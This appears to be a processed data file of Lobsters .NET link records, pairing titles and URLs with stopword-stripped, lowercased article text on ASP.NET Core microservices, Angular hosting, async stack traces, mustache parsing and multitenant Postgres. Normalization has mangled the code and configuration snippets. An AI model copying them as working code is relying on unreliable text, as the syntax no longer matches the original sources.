296,Lobsters,dotnet,"C#, F#, .NET programming",Building a Secure Containerized Microservice With .NET Core,https://dzone.com/articles/building-a-secure-containerized-microservice-with,building secure containerized microservice net core,create net core project set serialization create model creating controller iactionresult selfcontained deployment setting linux host nginx dotnet friendlyphonenumberdll add ssl service setting let encrypt server building docker container conclusion available,microservices craze full swing good reason silver bullet every problem certainly becoming practical solution scalability resilience enterprise software system net core project also made great progress arena enabling make solid crossplatform application utilizing prewritten code net core framework enables develop lean microservices window osx linux workstation deploy either window osx linux server ability generate linux binary mean take advantage containerization platform today going show easy build rest microservice net core web api deploy container debian server ample documentation covering part process comprehensive tutorial showing process start finish create net core project use dotnet cli create application need machine net core sdk installed window mac linux text editor using visual studio code optional way test web api using postman note use visual studio window create project builtin wizard result prefer manually first need create project command prompt dotnet new webapi friendlyphonenumber scaffold new net core web api project everything need included friendlyphonenumber directory work identically three o platform set serialization open friendlyphonenumbercsproj file add following itemgroup containing package reference packagereference include microsoftaspnetcoreall version packagereference include systemruntimeserializationprimitives version add serialization service project run dotnet restore enable control serialization specifically naming property chosen format opposed c naming convention create model service us rest api going sending json object process data return new object using web request although single property create model object sent returned save file create container outgoing phone number formatted similar fashion create another class named formattedphonenumbercs make sure include systemruntime serialization object using systemruntimeserialization namespace friendlyphonenumbermodels datacontract name formattedphonenumber public class formattedphonenumber datamember name phonenumber public string phonenumber get set finally let create class core service phone number converter take numeric phone number convert friendly text using system namespace friendlyphonenumbermodels public class phonenumberformatter public long numericphonenumber get set public string formattedphonenumber get set public void convertphonenumber formattedphonenumber stringformat numericphonenumber nice testable object extend later feel like creating controller next create controller new project delete valuescontrollerscs controller folder sample one added net cli wo nt using create new class call formatphonenumbercs class create single method take post numeric phone number return object formatted object add using microsoftaspnetcoremvc model make sure class extends controller class proper functionality using microsoftaspnetcoremvc using friendlyphonenumbermodels namespace friendlyphonenumbercontrollers route api controller public class formatphonenumber controller phonenumberformatter formatter new phonenumberformatter public iactionresult post frombody numericphonenumber phonenumber phonenumber null formatternumericphonenumber phonenumberphonenumber formatterconvertphonenumber formattedphonenumber friendlynumber new formattedphonenumber phonenumber formatterformattedphonenumber return ok friendlynumber else return badrequest controller take post object formatted numeric number return iactionresult object containing friendly formatted phone number save file ready run application dotnet run see something like web api running http quick smoke test postman postman create simple post sends raw json http object send look like phonenumber service process object get nicely formatted result know service working expected let publish framework dependent build application dotnet publish f c release build application run supported target use installed net core framework machine quick note publish selfcontained deployment specified target case would debian would publish everything needed run including framework run machine without net core framework installed however build larger comparison since creating microservice want build smaller leaner container replicate scale needed build completes application artifact use scp transfer file debian machine scp r yourusername host home yourusername appsfriendlyphonenumber setting linux host going deploy application linux server need copied artifact net core sdk installed able run dll dotnet friendlyphonenumberdll appears running great test quickly notice somethingif check response localhost produce output throw error sending json least see response processed try access externally see blocked nt work application listening localhost interface step application ideally using something like nginx proxy outside scope article set application listen outside interface directly open programcs project add following create default builder method usekestrel option optionslisten ipaddressany buildwebhost method look like rebuild project transfer new artifact run file dotnet friendlyphonenumberdlland access server externally got email project manager turn need secured ssl turn nt big problem sound add ssl service need generate certificate secure service use let encrypt build certificate use secure connection note distribution specific step setting let encrypt debian skip already let encrypt installed certificate server using different distribution consult documentation setting let encrypt server next install let encrypt part debian distribution sudo aptget install pythoncertbotnginx stretch run certbot set certificate without installing web server sudo certbot certonly since nt webserver installed asks want handle authentication piece select temporary webserver standalone filling information certificate created etcletsencryptlivesandboxjeremymorgancomfullchainpem location vary depending url using need convert pfx use kestrel net core web server following generate pfx cert application folder sudo openssl export friendlyphonenumberpfx inkey etcletsencryptlivesandboxjeremymorgancomprivkeypem etcletsencryptlivesandboxjeremymorgancomcertpem certfile etcletsencryptlivesandboxjeremymorgancomchainpem server want replace sandboxjeremymorgancom domain name location ask export password create one make note using minute change ownership pfx use sudo chown jeremy friendlyphonenumberpfx generated pfx file site next need modify application listen ssl connection programcs replace kestrel option added earlier following optionslisten ipaddressany listenoptions listenoptionsusehttps friendlyphonenumberpfx password look like add another package reference csproj packagereference include microsoftaspnetcoreserverkestrelhttps version rebuild redeploy app linux host completed access endpoint securely ready put container building docker container docker installed configured server want build container application going create new directory docker container containersfriendlyphonenumber next create artifact folder directory copy binary certificate mkdir artifact cp r appsfriendlyphonenumber artifact create docker file directory going fairly simple configuration workdir app copy artifact expose entrypoint dotnet friendlyphonenumberdll file simply start aspnetcore base image creates working directory copy artifact container open port run application docker file build image docker build build first image let run docker run p latest going run container detached map port host machine hit curl see available outside time running docker container want need spin another identical container docker run p latest name container identical listens port addition one listening fact could create bunch use something like kubernetes load balancing container management lot possibility easily scale application use lot container even server conclusion article covered creating ssl secured containerized microservice net core covered process start finish build production application certainly want better error handling use something like nginx proxy kubernetes manage container easy set net core package make really easy build solid microservices scale cloud source code docker file application available question remark feel free leave comment
298,Lobsters,dotnet,"C#, F#, .NET programming",WTF# is concurrency,https://wtfsharp.net/wtf-is-concurrency,wtf concurrency,,social network quick link
299,Lobsters,dotnet,"C#, F#, .NET programming",bamboo/idris-cil - A Common Intermediate Language backend for Idris,https://github.com/bamboo/idris-cil,bambooidriscil common intermediate language backend idris,idriscil idris usage net core installing contributing contributor license requirement net core ilasm,idriscil common intermediate language backend idris programmer targeting clr deserve modern pure functional language dependent type usage given mainidr file module main main io main putstrln hello idris compile cil execute net core idris codegen cil mainidr helloworldexe dotnet helloworldexe resulting assembly also used mono unity installing important version idris executable match version used build idriscil git clone git githubcom bambooidriscil cd idriscil stack install idris stack install contributing issue report pr welcome brought bamboo sangamon contributor license requirement net core ilasm install ilasm using nuget dotnet new console ilasmsetup cd ilasmsetup dotnet add package cd rm fr ilasmsetup replace prefix right value system instance add ilasm path something like export path find homenugetpackages name ilasm xargs dirname path get error ilasm saying load libcoreclrdylib add dotnetshared dir dyldlibrarypath export dyldlibrarypath
300,Lobsters,dotnet,"C#, F#, .NET programming",Making Poirot Fast,https://www.kylesletten.com/2018/02/02/making-poirot-fast.html,making poirot fast,parsing like pro every character string evaluating expression making parser skim future work,way introduction poirot mustache rendering engine net standard descends sharpstache earlier project net framework originally created sharpstache intent beating performance nustache new target poirot beat stringreplace say ca nt unachievable goal possibly flawed recollection performance work spanned two net package parsing like pro performance test nustache package found amazing amount time spent package parsing regexes parse mustache regular expression amazing thing fast tool language call regex vaguely resemble concept computer science first problem regexes parsinginterpreting inserting whole programming language dynamic one template metal mitigated somewhat compiled regexes allow spend extra cycle startup ensure much faster execution still nt protect second problem backtracking possible parser always moving forward even basic operation regex like operator start going backward ca nt find match example say wanted find first string definitely thing would want mustache parser might tempted something like regex read match zero character match two would never ship regex besides slow would also wrong see think pattern differently regex implementation strict orderofoperations regex implementation start beginning pattern pump longer work meaning generate code like following true advance continue try match character ca nt mean simple string like hello name pattern first match every character string part trying find first seeing nothing left string already advanced end start backtrack one character time checking first check start back check start finally get name point try find second fail backing want matching hello even input string long first character wo nt go looking try every character first huge problem solved nongreedy modifier change behave normally expect respect performance given regex path mired problem proceed suggest thing oldfashioned way iterate string looking code lot longer performance application nt dependent precompiling backtrackingcrazed language simple job finding evaluating expression original version sharpstache writing parsing hand far front performance problem punted actual property access used reflection code pretty short tothepoint special case handle thing ienumerable dictionary problem pretty slow reflection system responsible lot constantly querying question created room improvement since committed making something fast instead something easy simple figure avoid lookup thankfully c great library generate new code compiletime systemlinqexpression allows generate code basically way think writing one method call property access time first time would see new type would generate couple function first one would generate property getter rather lookup property get generated switch statement name property object handled case accessing correct property pseudocode look like public object getitem string property switch property case return case return default return null mean nt query reflection apis information changing like property class really helped speed complicated pattern property called loop general generally type passed template making parser skim inspired technique heard mentioned part grep realized larger template text middle could skip half letter average looking old code looked something like simplified public int findbrace string template int start int start templatelength template template return return templatelength much faster sort regex shenanigan actually better even skip every letter still see one meant could convert code something like public int findbrace string template int start int start templatelength template template return templatelength template return return templatelength comparing every character additional cost look way find overall however pretty big win future work would love part fastest mustache parser net time always thinking optimization could perform find interesting would like help project github http githubcomkbslettenpoirot feel free open issue send pull request great idea looking mustache renderer net core net framework project give poirot go let know think
302,Lobsters,dotnet,"C#, F#, .NET programming",Stacktrace improvements in .NET Core 2.1,https://www.ageofascent.com/2018/01/26/stack-trace-for-exceptions-in-dotnet-core-2.1/,stacktrace improvement net core,intelligible stack trace async iterators dictionary key found issue stack trace davkean dotnetcorefx pr post exception stack dotnetcoreclr pr edi boundary dotnetcoreclr pr iterators async method dotnetcoreclr pr item added anipik dotnetcoreclr downlevel runtimes going bendemystifier code exception stacktraces,intelligible stack trace async iterators dictionary key found net core intelligible async stack trace mean bold claim well determine correct overload called async iterator method stacktrace possible previously systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key programsequence start movenext programsequence start end movenext programmethodasync programmethodasync programmethodasync programmethodasync programmethodasync programmain string args issue stack trace david kean davkean raised following issue make stack trace readable dotnetcorefx corefx oct task async await prevalent stack trace become lot le readable stack trace output net async winding occurred october saw issue since net core fully open source could actually change refresher code bottom post output following stack trace thrown exception systemcollectionsgenerickeynotfoundexception given key present dictionary systemthrowhelperthrowkeynotfoundexception systemcollectionsgenericdictionary tkey key program sequence program sequence program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program main line number removed brevity eg c workexceptionsprogramcs line sometimes even verbose glue section systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterthrowfornonsuccess task task systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task systemruntimecompilerservicestaskawaitervalidateend task task systemruntimecompilerservicestaskawaitergetresult general purpose stack trace determine source code error occurred path got point however async stack trace till impenetrable contain lot unhelpful noise pr post exception stack stack trace generally expected direct flow exception thrown caught async function resume exception performs extra step determine respond ensure cleanup done continuing extra step get added call stack help anyway determine call stack occur exception well noisy repeative add value determining code reached point call stack happened call stack reported agree removing post exception stack frame hide post exception stack frame dotnetcoreclr stack trace start become approachable systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key program sequence program sequence program methodasync end stack trace previous location exception thrown program methodasync end stack trace previous location exception thrown program methodasync end stack trace previous location exception thrown program methodasync end stack trace previous location exception thrown program methodasync end stack trace previous location exception thrown program main reported call stack agrees actual call stack pr edi boundary exception async propagated using exceptiondispatchinfo class mark boundary join point end stack trace previous location exception thrown inform two call stack merged transition occurred async frequent noise add value remove edi boundary async dotnetcoreclr stack trace becomes valuable systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key program sequence program sequence program methodasync program methodasync program methodasync program methodasync program methodasync program main pr iterators async method point stacktrace clean noise however still hard determine exactly called stacktrace contains method signature async statemachine infrastructure created c compiler original source code detemine method name present determine exact overload called without digging deeper resolve iterators async method stacktrace dotnetcoreclr stacktrace much closer orignial source systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key programsequence start movenext programsequence start end movenext programmethodasync programmethodasync programmethodasync programmethodasync programmethodasync programmain string args pr item added picked throw exception example additional bonus anirudh agnihotry anipik added key item added keynotfoundexception dotnetcoreclr mean exception actually give information key found systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key programsequence start movenext programsequence start end movenext programmethodasync programmethodasync programmethodasync programmethodasync programmethodasync programmain string args downlevel runtimes going hopefully coming mono shortly net framework later stage earlier runtime version net core net framework mono get similar effect plus using bendemystifier nuget package using demystify exception catch exception e consolewriteline edemystify produce richer output match c source code nice built systemcollectionsgenerickeynotfoundexception given key present dictionary tvalue systemcollectionsgenericdictionary tkey tvalue getitem tkey key ienumerable int programsequence int start movenext ienumerable int programsequence int start int end movenext async task int programmethodasync async task int programmethodasync int async task int programmethodasync int int async task int programmethodasync int int int async task int programmethodasync int int int int async task programmain string args net core best version net core many reason one little thing make code exception stacktraces code generates exception stacktrace class program static dictionary int int dict new dictionary int int static async task main string args try var value await methodasync consolewriteline value catch exception e consolewriteline e static async task int methodasync int int int int await methodasync static async task int methodasync int int int await methodasync static async task int methodasync int int await methodasync static async task int methodasync int await methodasync static async task int methodasync await taskdelay int value foreach var sequence value return value static ienumerable int sequence int start int end var start end foreach var item sequence yield return item static ienumerable int sequence int start var end start var start end dict dict throw exception yield return
304,Lobsters,dotnet,"C#, F#, .NET programming",Angular and ASP.NET Core,http://www.blinkingcaret.com/2018/01/24/angular-and-asp-net-core/,angular aspnet core,angular cli webpack systemjs webpackdevserver using aspnet core serve angular application middlewares http open project add nginx nginx http aspnet core scratch best match http wwwyourwebsitecomassetsimagejpg http wwwyourwebsitecomdocuments nginx documentation optional uri url uri http aspnet core scratch supervisor ii http localhost http localhostapi http localhostapi angular ii virtual user created local http localhostdocuments custom page aspnet core ii aspnet core module ii actually acting reverse proxy enable cors platform agnostic development setup webpack development server hot module replacing,angular cli provides way develop frontend application using angular hide lot detail example requirement understand webpack systemjs work fact know little bit webpack used build latest version angular application cli almost look like magic need ng new ng serve open working angular application open web browser fact cli hide plumbing might lead question like use angular aspnet core hope end blog post clear answer question aspnet core whichever technology want use angular app see angular app app need served somehow web server compile angular application producing set javascript cs one indexhtml file default folder artifact get copied yourapplicationfolderdist check going angular application ng build go wait ng serve open actually using standalone web server webpackdevserver serve indexhtml file dist folder rest blog post describe several approach take using angular aspnet core first aspnet core serve angular file second approach angular aspnet core different application example achieve using nginx angular aspnet core served using port ii application served port final part post describes setup consider ideal use angular ng serve development post quite long section fairly independent interested last section using window recommend also reading section configure angular ii using aspnet core serve angular application argued serving angular application within aspnet core wasteful term resource end angular application set static file need request file go aspnet core middleware pipeline might good reason though also harm knowing since seems common approach familiar might useful one important thing know order understand serve aspnet core angular application together understand request processed aspnet core run aspnet core application request go pipeline middlewares every time request come go middlewares order defined reverse order every middleware opportunity change request response two time middlewares executed middlewares executed allows middleware top pipeline handle example response set middleware pipeline example authentication middlewares change response redirect login page find definition pipeline startupcs file configure method example pipeline get dotnet new mvc public void configure iapplicationbuilder app ihostingenvironment env envisdevelopment appusedeveloperexceptionpage else appuseexceptionhandler homeerror appusestaticfiles appusemvc route routesmaproute name default template controllerhome actionindex id every time request come aspnet core application go three middlewares first developerexceptionpageexceptionhandler middleware depending aspnet core application running development mode staticfiles middleware finally mvc middleware middleware key staticfiles middleware serf file contained wwwroot folder ie request come indexhtml indexhtml file wwwrootindexhtml file sent client staticfiles middleware call middlewares case would mvc probably already see could work angular application put wwwroot absolutely correct however detail staticfiles important know staticfiles try guess ie request staticfiles look indexhtml assume request supposed handled call next middleware pipeline case mvc approach work need another middleware named defaultfiles must come staticfiles pipeline appusedefaultfiles appusestaticfiles defaultfiles cause cause staticfiles look indexhtml url end thing left configure angular cli compile aspnet core application wwwroot folder look angular application folder find angularclijson file file look outdir property apps outdir dist change dist path aspnet core wwwroot folder run ng build angular application run aspnet core web application see angular application browser nice development workflow run angular cli build watch mode console window ng build watch ng build w want save key stroke leave running every time make change angular application refresh browser see change also need aspnet core application running one thing missing approach though deeplinking support ie angular application us routing send user url valid angular route eg http receiving user able open trying get route result found response request go way aspnet core application pipeline reach mvc middleware know set response status code page found top pipeline look response sent change path angular application indexhtml file way get served angular application know url term routing make request go pipeline add start configure appuse async httpcontext context func task next await nextinvoke contextresponsestatuscode contextrequestpath new pathstring indexhtml await nextinvoke fix deep link introduces new problem web api implemented aspnet core application need send response something reasonable instead service call receive response indexhtml solution look url decide intended web api angular route usually call web api api url simple test perform solve problem revised version custom middleware solves problem add start configure appuse async httpcontext context func task next await nextinvoke contextresponsestatuscode contextrequestpathvaluecontains api contextrequestpath new pathstring indexhtml await nextinvoke one last note approach seen example angular application visual studio solution aspnet application visual studio v code try compile typescript file using ng build w want visual studio leave typescript file alone open project csproj add propertygroup typescriptcompileblocked true typescriptcompileblocked nginx nginx web server act reverse proxy aspnet core application also good serving static content setup angular application work aspnet core much simpler nginx need configuration similar server listen location root pathtoyourangularapplicationdist index indexhtml tryfiles uri uri indexhtml location api proxypass http typical nginx configuration file look like familiar nginx aspnet core recommend blog post http aspnet core scratch section instruction install setup website using nginx configuration allows u angular aspnet core application port let look important part listen statement establishes nginx respond request coming port location block going define two application served angular aspnet time request come nginx look url try find location block best match case location block url act like prefix match ie first block match every url every url start second location block match url start api nginx pick specific location block even though request apiusers would match location block since second one api specific one would used handle request first location block root pathtoyourangularapplicationdist set path static content looked location compiled angular application file dist cli default output folder index indexhtml specifies file served url end tryfiles uri uri indexhtml read way check file match normalized url eg http wwwyourwebsitecomassetsimagejpg assetsimagejpg file exist try normalized url plus eg http wwwyourwebsitecomdocuments document documentsindexhtml index rule fails serve file indexhtml serving indexhtml match found enables u use deep linking example url http wwwyourwebsitecomdocuments math file system served angular application indexhtml indexhtml load necessary file angular application run specifically routing module routing module look url according route defined angular app decide component load finally last location block instructs nginx forward request start api webserver listening port localhost aspnet core application one note nginx syntax proxypass matter lot url application end url proxypass treated differently described nginx documentation optional uri optional uri great name since end url uri example url optional uri http location path api request http yourwebsitecomapiusers forwarded aspnet core application http adding end proxypass important eg proxypass http fall optional uri category interpreted empty optional uri request http yourwebsitecomapiusers seen aspnet core application request http add end eg proxypass http request http yourwebsitecomapiusers seen aspnet core application request http probably want need complete example explains make work outside developmenttime scenario ie aspnet core application auto start remain online even exception check http aspnet core scratch example describing use supervisor keep aspnet application running even event error auto restarting ii ii becomes cumbersome configuration similar nginx angular aspnet core application served port understand make easier understand ii concept website application create website define among setting port eg served website several application inside share website configuration therefore served port could example put angular application inside default web site aspnet core one ii application call example api default web site responds http localhost aspnet core application could http localhostapi seems exactly want however request http localhostapi would seen aspnet core without api url far know way change behavior mean aspnet core application behave differently running inside ii v executed directly either visual studio dotnet run make matter worse aspnet core application need published dotnet publish work ii like noncore aspnet application point ii application folder contains aspnet application file using ii reasonable option either aspnet core serve angular application described first section article two separate website let walkthough process creating two separate website first website angular project aspnet core angular ii adding website named myngwebsite port mean default web site likelihood need stop change binding since default port get need create application pool angular application right click application pool ii manager application pool angular application require managed code need serve static file choose managed code net clr version add new ii web site set new application pool created application pool physical path set angular project compiled usually dist folder try access http localhost right assuming stopped default web site used different port would get permission error create application pool virtual user created user local user must permission access folder contains file trying serve user name ii apppoolapplicationpoolname example ii apppoolapplicationpoolforangular go folder contains compiled angular project right click select property go security tab click edit add finally add application pool user able access angular application go http localhost still need one thing though enable deeplinking support route angular application work someone try access outside angular app mean navigating http localhostdocuments valid inside angular application send url someone else someone else click link greeted page ii document folder index file inside ii serve need tell ii must serve file indexhtml someone try access url exists going use mechanism used custom page instead page serve angular application achieve need create webconfig file put src folder angular application inside xml version encoding configuration systemwebserver httperrors errormode custom existingresponse replace remove statuscode error statuscode responsemode executeurl path indexhtml httperrors systemwebserver configuration quick explanation going using httperrors errormode custom existingresponse replace instructs ii replace default error page one specify remove statuscode remove custom setting page already exist error statuscode responsemode executeurl path indexhtml configure ii execute indexhtml url error effectively serve angular application change url seen client need edit angularclijson file webconfig get copied output folder asset application compiled asset section app example schema nodemodules angularclilibconfigschemajson project name yourapp apps root src outdir dist asset asset faviconico webconfig index indexhtml aspnet core ii process configuring aspnet core application ii similar although need select different port start need make sure aspnet core module ii installed might already installed installed net core sdk however best way make sure go ii manager see module list find information direct link download module take care starting keeping aspnet core application running create website ii need published version aspnet core application command line dotnet publish full visual studio right click project select publish click publish folder create new website point aspnet core project published folder give different port number example create application pool application pool aspnet core application also unmanaged managed code although might seem odd ii actually acting reverse proxy able run aspnet project using ii need changed published folder permission application pool user access get moderately unhelpful error message http error internal server error requested page accessed related configuration data page invalid look config error section see read configuration file due insufficient permission pretty much say go published folder add application pool user list user permission folder aspnet core application available port selected created website ii however try call angular application get error failed load accesscontrolalloworigin header present requested example would look like developer tool console tab even though angular aspnet core application domain different port enough qualify request cross origin resource sharing cors request browser except ie need enable cors aspnet core application need add package microsoftaspnetcorecors configureservices iservicecollection service method startupcs add servicesaddcors public void configureservices iservicecollection service servicesaddcors configure method need create policy say expecting request http localhost mvc middleware public void configure iapplicationbuilder app ihostingenvironment env appusecors builder builderwithorigins http localhost appusemvc good go angular aspnet core working platform agnostic development setup angular aspnet core application provide way detect running development production mode leveraged create setup work linux window mac easiest way run angular application use run ng serve spin webpack development server serf angular application port default also advantage hot module replacing mean see change angular application soon make without even refresh browser ideally want run angular application way aspnet core application want run without publish would served ii ideal development scenario ng serve angular dotnet run running aspnet core visual studio without publish ideal scenario developing could angular application running port ng serve aspnet core application running port production angular application would typically served port aspnet core application port example different server port aspnet core side thing configure cors accept request port development port production startupcs would look like public void configureservices iservicecollection service servicesaddcors method get called runtime use method configure http request pipeline public void configure iapplicationbuilder app ihostingenvironment env envisdevelopment appusecors builder builderwithorigins http else appusecors builder builderwithorigins http localhost appusemvc take care aspnet core application angular need leverage environemntts environemntprodts file find folder name environemnts src folder angular project put environmentts available run development mode default value environmentprodts used production compile angular project environment set production use envprod flag eg ng build envprod simple example environment file could configured support hypothetical scenario environmentts export const environment production false apibaseurl http environmentprodts export const environment production true apibaseurl http localhost angular service get environment value need import environment always environment environmentprod import injectable angularcore import httpclient angularcommonhttp import environment environmentsenvironment injectable export class myserviceservice constructor private httpclient httpclient getstuff return thishttpclientget environmentapibaseurl apisuff approach would work even host nginx ii probably best option needwant support developer using different platform want compare performance related
305,Lobsters,dotnet,"C#, F#, .NET programming",Resources for Learning about .NET Internals,http://www.mattwarren.org/2018/01/22/Resources-for-Learning-about-.NET-Internals/,resource learning net internals,resource learning net internals feature x work underthehood note awesome net performance adam sitnik recommend reading entire list read source special mention sasha goldshtein longer anyone update net type internals microsoft clr perspective book runtime botr svick reminding explains table content note microsoft engineer maoni weblog clr garbage collector maoni stephen cbrumme weblog christopher brumme blog coding net net compact framework life general abhinaba basu joel pobar clr weblog clr program manager reflection lcg generic type system joel pobar clr profiling api blog info common language runtime profiling api david broman yun jin weblog clr internals rotor code explanation clr debugging tip trivial debugging note net programming pitfall yun jin jit ngen managed code generation stuff detail ryujit stuff sort distributed matter troubleshooting issue technology available developer building distributed application carlo b net blog bart de smet online blog question bart de smet nate mcmaster blog nate mcmaster book new release hackernews rprogramming,resource learning net internals jan word started tweet seemed resonate people aim list blog specifically cover net internals lowlevel put another way blog answer question feature x work underthehood list includes either typical post blog favourite note wider list net performance related blog see awesome net performance adam sitnik recommend reading entire list least one go brain probably melt pick poststopics interest start finally bear mind post year old chance thing changed since however experience lowlevels part clr stable want doublecheck latest behaviour best option read source blog written nonmicrosoft employee afaict work microsoft work directly clr missed interesting blog please let know special mention go sasha goldshtein blogging longer anyone update missed blog learnt new one honourable mention go net type internals microsoft clr perspective codeproject great article book runtime botr botr deserves section thanks svick reminding heard botr nice faq explains book runtime set document describe component clr bcl intended focus architecture invariant annotated description codebase originally created within microsoft including document developer responsible document feature area helped new devs joining team also helped share product architecture across team find way around recommend starting table content diving note written developer working clr introductory document recommend reading blog post first referring botr basic knowledge instance many blog post started reading chapter botr fully understanding going away learning writing found pointing people relevant botr page information microsoft engineer blog written actual engineer worked designed managed various part clr give deep insight missed blog please let know maoni weblog clr garbage collector maoni stephen cbrumme weblog christopher brumme blog coding net net compact framework life general abhinaba basu joel pobar clr weblog clr program manager reflection lcg generic type system joel pobar clr profiling api blog info common language runtime profiling api david broman slightly niche still worth read yun jin weblog clr internals rotor code explanation clr debugging tip trivial debugging note net programming pitfall yun jin jit ngen managed code generation stuff detail ryujit stuff sort various distributed matter troubleshooting issue technology available developer building distributed application carlo b net blog bart de smet online blog question bart de smet nate mcmaster blog nate mcmaster book finally prefer reading offline decent book discus net internals note link amazon affiliate link book listed copy read covertocover fantastic resource also recently recommend book look good certainly author know stuff read yet new release discus post hackernews rprogramming
306,Lobsters,dotnet,"C#, F#, .NET programming",Multi-tenant web apps with ASP.NET Core and Postgres,https://www.citusdata.com/blog/2018/01/22/multi-tenant-web-apps-with-dot-net-core-and-postgres/,multitenant web apps aspnet core postgres,multitenant stack exchange aspnet core sharding citus set postgres database citus postgresql download page citus cloud local docker installation shard colocate create new aspnet core project net core sdk microsoft little aspnet core book npgsqlentityframeworkcorepostgresql secret manager define entity framework core context model data schema install saaskit saaskit tenantaware saaskitmultitenancy tenant caching strategy update view query database test app edit host file default tenant behavior build scalable multitenant apps github citus slack channel enjoy reading,come building largescale multitenant application microsoft aspnet platform strong choice like popular web framework express django aspnet used build web application apis around let fool aspnet pack serious muscle power one biggest q network web stack exchange past aspnet apps could run window server changed latest version aspnet core fully open source crossplatform aspnet core run anywhere need window mac linux docker feature modern middleware pipeline rich package ecosystem blazingfast performance experience working multitenant enterprise apps taught never early design scale architect code matter architect data past apps worked designed around databasepertenant databasepertenant model scale caused problem app reached thousand customer aka tenant post show different approach scale underlying database aspnet sharding sharding leave behind drawback databasepertenant model scale infinitely blog post show build multitenant app scale mind learn use aspnet core middleware pipeline plus sharding feature postgres citus build scalable multitenant application aspnet core along way start build mvp stackexchange let get started set postgres database citus need psql interact database install postgresql download page also install via chocolatey window homebrew mac create citus cloud database cluster exercise andconnect via psql connectionstring alternately install citus extension postgres locally using local docker installation docker exec citusmaster psql u postgres connected citus cluster create two table create table tenant id uuid null domain text null name text null description text null createdat timestamptz null updatedat timestamptz null create table question id uuid null tenantid uuid null title text null vote int null createdat timestamptz null updatedat timestamptz null alter table tenant add primary key id alter table question add primary key id tenantid application tenant mapped domain name aspnet core inspect incoming request look domain tenant table could also look tenant subdomain scheme want notice tenantid also stored question table make possible shard colocate data table created use createdistributed table tell citus shard tenant id select createdistributedtable tenant id select createdistributedtable question tenantid sharding complex topic citus make easier taking care lot lowlevel concern time test data copy paste insert statement put tenant question database insert tenant value bufferoverflowlocal buffer overflow ask anything coderelated insert tenant value dboverflowlocal database question figure connection string broken insert question value build apps aspnet core insert question value using postgresql multitenant data done database architected seeded test data move setting aspnet core create new aspnet core project aspnet core installed install net core sdk microsoft new aspnet core download free little aspnet core book get speed instruction use dotnet cli also use visual studio newer window create new project mvc template dotnet new dotnet new mvc questionexchange cd questionexchange preview template site dotnet run like mvc template includes almost everything need get started postgres support included box fix installing npgsqlentityframeworkcorepostgresql package dotnet add package npgsqlentityframeworkcorepostgresql package add postgres support entity framework core default orm database layer aspnet core open startupcs file add line anywhere configureservices method var connectionstring connectionstring servicesaddentityframeworknpgsql adddbcontext appdbcontext option optionsusenpgsql connectionstring also need add declaration top file using microsoftentityframeworkcore using questionexchangemodels replace connectionstring citus connection string mine look like servermyformationdbcitusdatacom databasecitus useridcitus passwordmypassword sslmoderequire trust server certificatetrue note use secret manager avoid storing database credential code accidentally checking source control next need define database context define entity framework core context model database context class provides interface code database entity framework core us understand data schema look like need define table available database create file called appdbcontextcs project root add following code using systemlinq using microsoftentityframeworkcore using questionexchangemodels namespace questionexchange public class appdbcontext dbcontext public appdbcontext dbcontextoptions appdbcontext option base option public dbset tenant tenant get set public dbset question question get set two dbset property specify c class use model row table create class next add new method question property protected override void onmodelcreating modelbuilder modelbuilder var mapper new npgsqlnpgsqlsnakecasenametranslator var type modelbuildermodelgetentitytypes tolist refer table snakecase internally typesforeach e erelational tablename mappertranslatemembername erelational tablename refer column snakecase internally typesselectmany e egetproperties tolist foreach p prelational columnname mappertranslatemembername prelational columnname c class property pascalcase convention postgres table column lowercase snakecase onmodelcreating method let override default name translation let entity framework core know find entity database add class represent tenant question create tenantcs file model directory using system namespace questionexchangemodels public class tenant public guid id get set public string domain get set public string name get set public string description get set public datetimeoffset createdat get set public datetimeoffset updatedat get set questioncs file also model directory using system namespace questionexchangemodels public class question public guid id get set public tenant tenant get set public string title get set public int vote get set public datetimeoffset createdat get set public datetimeoffset updatedat get set notice tenant property database question table contains tenantid column entity framework core smart enough figure property represents onetomany relationship tenant question use later query data far set entity framework core connection citus next step adding multitenant support aspnet core pipeline install saaskit saaskit excellent piece opensource aspnet core middleware package make easy make startup request pipeline tenantaware flexible enough handle many different multitenancy use case install saaskitmultitenancy package dotnet add package saaskitmultitenancy saaskit need two thing work tenant model tenant resolver already former tenant class created earlier create new file project root called cachingtenantresolvercs using system using systemcollectionsgeneric using systemthreadingtasks using microsoftaspnetcorehttp using microsoftentityframeworkcore using microsoftextensionscachingmemory using microsoftextensionslogging using saaskitmultitenancy using questionexchangemodels namespace questionexchange public class cachingtenantresolver memorycachetenantresolver tenant private readonly appdbcontext context public cachingtenantresolver appdbcontext context imemorycache cache iloggerfactory loggerfactory base cache loggerfactory context context resolver run cache miss protected override async task tenantcontext tenant resolveasync httpcontext context var subdomain contextrequesthosthosttolower var tenant await contexttenants firstordefaultasync tdomain subdomain tenant null return null return new tenantcontext tenant tenant protected override memorycacheentryoptions createcacheentryoptions new memorycacheentryoptions setabsoluteexpiration timespanfromhours protected override string getcontextidentifier httpcontext context contextrequesthosthosttolower protected override ienumerable string gettenantidentifiers tenantcontext tenant context new string contexttenantdomain resolveasync method heavy lifting given incoming request query database look tenant matching current domain find one pass tenantcontext back saaskit tenant resolution logic totally could separate tenant subdomains path anything else want implementation us tenant caching strategy hit database tenant lookup every incoming request first lookup tenant cached two hour change whatever make sense tenant model tenant resolver 